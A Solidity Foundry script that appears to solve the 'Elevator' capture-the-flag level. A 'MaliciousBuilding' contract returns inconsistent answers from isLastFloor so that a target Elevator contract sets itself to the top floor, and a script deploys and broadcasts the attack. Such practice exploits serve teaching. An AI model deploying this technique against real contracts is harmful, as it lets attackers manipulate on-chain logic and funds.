/*
This elevator won't let you reach the top of your building. Right?

Things that might help:
Sometimes solidity is not good at keeping promises.
This Elevator expects to be used from a Building.
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Elevator} from "src/Elevator.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract MaliciousBuilding {
    bool isFirst = true;

    function isLastFloor(uint256) external returns (bool) {
        if (isFirst) {
            isFirst = false;
            return false;
        }
        return true;
    }

    function attack(Elevator elevator) external {
        elevator.goTo(1);
    }
}

contract ElevatorSolution is Script {
    Elevator public elevator = Elevator(0xcC3CfC8305F62A1D0B8dd00c896DeC56b59Ded59);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        MaliciousBuilding building = new MaliciousBuilding();
        console.log("Current floor:", elevator.floor());
        console.log("Current top:", elevator.top());
        building.attack(elevator);
        console.log("Current floor:", elevator.floor());
        console.log("Current top:", elevator.top());
        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
